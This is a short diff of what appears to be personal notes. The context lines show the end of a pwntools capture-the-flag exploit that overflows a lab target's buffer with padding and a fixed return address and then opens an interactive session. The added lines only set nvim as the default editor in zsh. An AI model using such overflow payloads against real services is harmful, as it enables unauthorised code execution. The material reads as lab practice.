@@ -254,3 +254,12 @@ cn=remote('192.168.120.192',12345) # 靶机部署的地址
 cn.sendline(p64(0)*3+p64(0x4011b6))
 cn.interactive()
 ```
+
+#===== change default editor =====
+```sh 
+vim ~/.zshrc 
+export EDITOR=nvim 
+source ~/.zshrc
+```
+
+
